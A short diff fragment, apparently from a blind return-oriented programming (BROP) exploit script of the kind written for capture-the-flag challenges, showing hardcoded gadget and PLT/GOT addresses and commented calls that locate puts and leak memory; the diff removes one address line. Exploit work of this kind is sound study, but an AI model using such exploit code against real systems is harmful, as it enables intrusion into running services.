@@ -1093,7 +1093,6 @@ brop_gadget = 0x4007ba
 rdi_ret = brop_gadget + 9
 #puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
 puts_plt = 0x400560
-addr = 0x400000
 #leakfunction(length, rdi_ret, puts_plt, stop_gadget)
 puts_got = 0x601018
 
